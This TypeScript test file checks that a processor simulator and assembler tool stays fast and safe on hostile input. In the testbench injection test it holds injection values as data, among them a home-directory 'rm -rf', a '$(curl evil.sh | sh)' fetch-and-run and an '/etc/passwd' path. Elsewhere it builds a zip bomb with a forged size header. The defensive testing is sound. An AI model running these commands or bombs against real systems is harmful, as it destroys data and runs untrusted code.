/**
 * Adversarial-input tests: every parser that sees user files must stay fast
 * and bounded on pathological input, and generated code must never carry
 * user-controlled text into a place where it could execute.
 */
import { describe, expect, it } from "vitest";
import { assemble } from "./asm/assembler";
import { parseMemFile } from "./asm/memfile";
import { parseComment } from "./check/expectations";
import { risc6 } from "./isa/risc6";
import { decodeShare, encodeShare, emptySession, parseSession } from "./session/session";
import { simulate } from "./sim/simulator";
import { generateTestbench } from "./tb/testbench";
import { VcdParser } from "./vcd/parser";

const fast = (fn: () => unknown, ms = 1500) => {
  const t = performance.now();
  fn();
  expect(performance.now() - t).toBeLessThan(ms);
};

describe("no catastrophic backtracking", () => {
  it("assembler", () => {
    fast(() => assemble("LDD R1, " + "(".repeat(50_000) + "R1", risc6));
    fast(() => assemble("IADD R1, R1, " + "1_".repeat(100_000) + "!", risc6));
    fast(() => assemble(("ADD " + "R1,".repeat(2000) + "\n").repeat(50), risc6));
  });
  it("comment parser", () => {
    fast(() => parseComment("shouldn't" + " ".repeat(100_000) + "be", 1, "JZ"));
    fast(() => parseComment("R1=" + "F".repeat(100_000) + "_", 1, "ADD"));
    fast(() => parseComment("M[" + " ".repeat(100_000), 1, "ADD"));
    fast(() => parseComment("C -->" + " ".repeat(100_000), 1, "ADD"));
  });
  it(".mem import", () => {
    fast(() => parseMemFile(("0".repeat(31) + "2\n").repeat(40_000), risc6));
  });
});

describe("resource limits", () => {
  it("caps simulation length even when asked for more", () => {
    const asm = assemble(".ORG 0\n10\n.ORG 10\nJMP 10", risc6);
    const r = simulate({
      profile: risc6,
      options: risc6.defaultOptions,
      memory: asm.memory,
      inputs: new Map(),
      interrupts: [],
      maxSteps: 1e12,
    });
    expect(r.events.length).toBe(200_000);
  });
  it("rejects a decompression bomb in a share link", async () => {
    const huge = { ...emptySession(), source: "A".repeat(5_000_000) };
    const token = await encodeShare(huge);
    expect(token.length).toBeLessThan(200_000); // compresses well…
    expect(await decodeShare(token)).toBeNull(); // …but is refused on inflate
  });
  it("rejects VCD headers that never end", () => {
    const p = new VcdParser(() => new Set());
    expect(() => p.push("$comment " + "x ".repeat(5000))).toThrow();
  });
});

describe("generated testbench is injection-safe", () => {
  it("ignores hostile names and paths", () => {
    const evil = { ...risc6, hardware: { ...risc6.hardware, entity: 'p; end; --', pcSignal: "x >> ; report", compileOrder: ["../../etc/passwd", "ok.vhd"] } };
    const tb = generateTestbench({
      profile: evil,
      memFileName: '"; rm -rf ~; "',
      inputs: new Map(),
      interrupts: [],
      cycles: 100,
      rtlRoot: "$(curl evil.sh | sh)",
    });
    const all = tb.files.map((f) => f.content).join("\n");
    expect(all).not.toContain("rm -rf");
    expect(all).not.toContain("curl");
    expect(all).not.toContain("passwd");
    expect(all).not.toContain("end; --");
    expect(all).toContain("entity work.processor");
  });
});

describe("stored or shared state is validated", () => {
  it("survives garbage of every type", () => {
    for (const junk of [undefined, 1, "x", [], { v: 1, source: 42 }, { v: 1, options: "x", inputs: [1], userChecks: "x" }]) {
      const s = parseSession(junk);
      if (s) expect(typeof s.source).toBe("string");
    }
  });
  it("does not let __proto__ keys through", () => {
    const s = parseSession(JSON.parse('{"v":1,"inputs":{"__proto__":[1],"10":[2]}}'))!;
    expect(Object.keys(s.inputs)).toEqual(["10"]);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });
});

describe("code review intake", () => {
  it("skips a deflate zip bomb entry instead of inflating it", async () => {
    const { deflateRawSync } = await import("node:zlib");
    const { readZip } = await import("./review/intake");
    const { crc32 } = await import("./util/zip");
    const raw = new TextEncoder().encode("-- " + "A".repeat(20 * 1024 * 1024));
    const comp = deflateRawSync(raw);
    const name = new TextEncoder().encode("bomb.vhd");
    // Lie about the uncompressed size so only the streaming cap can stop it.
    const local = new Uint8Array(30 + name.length);
    const lv = new DataView(local.buffer);
    lv.setUint32(0, 0x04034b50, true);
    lv.setUint16(8, 8, true);
    lv.setUint32(14, crc32(raw), true);
    lv.setUint32(18, comp.length, true);
    lv.setUint32(22, 100, true);
    lv.setUint16(26, name.length, true);
    local.set(name, 30);
    const central = new Uint8Array(46 + name.length);
    const cv = new DataView(central.buffer);
    cv.setUint32(0, 0x02014b50, true);
    cv.setUint16(10, 8, true);
    cv.setUint32(20, comp.length, true);
    cv.setUint32(24, 100, true);
    cv.setUint16(28, name.length, true);
    cv.setUint32(42, 0, true);
    central.set(name, 46);
    const end = new Uint8Array(22);
    const ev = new DataView(end.buffer);
    ev.setUint32(0, 0x06054b50, true);
    ev.setUint16(10, 1, true);
    ev.setUint32(12, central.length, true);
    ev.setUint32(16, local.length + comp.length, true);
    const zip = new Blob([local, comp, central, end]);
    const r = await readZip(zip);
    expect(r.files).toEqual([]);
    expect(r.skipped[0].reason).toMatch(/2 MB when unpacked/);
  });
  it("reviews adversarial VHDL quickly and without throwing", async () => {
    const { reviewCodebase } = await import("./review/review");
    const nasty = ["(".repeat(20000), "end end end ;;;; process process", "entity e is port (" + "a, ".repeat(5000) + "b : in bit); end;", "'''''\"\"\"" + "x".repeat(50000)];
    for (const text of nasty) fast(() => reviewCodebase([{ path: "x.vhd", text }], 6), 3000);
  });
});
